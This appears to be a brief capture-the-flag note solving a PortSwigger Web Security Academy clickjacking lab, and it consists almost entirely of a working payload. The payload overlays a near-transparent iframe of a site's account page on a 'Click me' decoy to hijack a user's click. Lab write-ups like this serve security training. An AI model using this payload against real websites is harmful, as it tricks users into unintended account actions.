#ctf 

https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected

```html
<style> 
  iframe { 
    position: relative; 
    width: 500px; 
    height: 700px; 
    opacity: 0.0001; 
    z-index: 2; 
  } 
  div { 
    position: absolute; 
    top: 300px; 
    left: 60px; 
    z-index: 1; 
  } 
</style>
<div>Click me</div>
<iframe src="0ac200d604cfb7b6827babbf00490074.web-security-academy.net/my-account"></iframe>
```